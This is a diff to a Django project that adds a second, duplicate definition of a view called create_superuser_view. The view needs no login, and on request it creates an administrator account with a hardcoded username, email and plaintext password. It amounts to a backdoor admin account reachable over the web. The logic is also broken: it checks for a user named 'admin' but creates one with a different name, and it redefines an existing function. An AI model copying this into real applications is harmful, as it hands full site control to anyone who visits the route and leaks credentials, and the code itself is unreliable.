@@ -2004,3 +2004,20 @@ def create_superuser_view(request):
         created = True
 
     return render(request, "mrsafe/create_superuser.html", {"created": created})
+
+from django.contrib.auth import get_user_model
+from django.shortcuts import render
+
+def create_superuser_view(request):
+    User = get_user_model()
+    created = False
+
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser(
+            username='saidengineer',
+            email='saidengineer@hotmail.com',
+            password='Razan@1978'
+        )
+        created = True
+
+    return render(request, "mrsafe/create_superuser.html", {"created": created})
